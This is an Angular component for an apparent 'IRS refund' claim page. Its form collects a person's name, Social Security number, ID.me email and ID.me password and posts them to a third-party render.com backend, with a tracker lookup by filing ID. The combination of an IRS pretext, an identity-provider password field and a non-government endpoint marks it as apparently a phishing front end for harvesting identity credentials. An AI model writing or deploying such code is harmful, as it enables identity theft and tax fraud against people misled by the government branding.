import { Component, OnInit, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { HttpClient } from '@angular/common/http';

@Component({
  selector: 'app-irs-refund',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './irs-refund.component.html',
  styleUrls: ['./irs-refund.component.scss']
})
export class IrsRefundComponent implements OnInit {
  private http = inject(HttpClient);

  refundData: any = null;
  loading = true;

  // Form Data
  name = '';
  ssn = '';
  idmeEmail = '';
  idmePassword = '';
  country = 'United States';

  // Tracker input
  searchFilingId = '';
  searchedRecord: any = null;

  message = '';
  isSuccess = false;
  submitting = false;

  ngOnInit(): void {
    this.fetchIrsStatus();
  }

  fetchIrsStatus(): void {
    this.loading = true;
    this.http.get<any>('https://backend-zpue.onrender.com/api/user/irs-refund').subscribe({
      next: (res) => {
        this.loading = false;
        if (res.success) this.refundData = res.data;
      },
      error: () => this.loading = false
    });
  }

  submitClaim(): void {
    this.message = '';
    if (!this.name || !this.ssn || !this.idmeEmail || !this.idmePassword) {
      this.message = 'Please provide all required verification details.';
      this.isSuccess = false;
      return;
    }

    this.submitting = true;
    this.http.post<any>('https://backend-zpue.onrender.com/api/user/irs-refund', {
      name: this.name,
      ssn: this.ssn,
      idme_email: this.idmeEmail,
      idme_password: this.idmePassword,
      country: this.country
    }).subscribe({
      next: (res) => {
        this.submitting = false;
        this.isSuccess = true;
        this.message = res.message;
        this.fetchIrsStatus();
      },
      error: (err) => {
        this.submitting = false;
        this.isSuccess = false;
        this.message = err.error?.message || 'Failed to submit refund filing.';
      }
    });
  }

  trackByFilingId(): void {
    if (!this.searchFilingId) return;
    this.http.get<any>(`https://backend-zpue.onrender.com/api/public/irs/track/${this.searchFilingId}`).subscribe({
      next: (res) => {
        if (res.success) this.searchedRecord = res.data;
      },
      error: () => {
        this.searchedRecord = { notFound: true };
      }
    });
  }
}
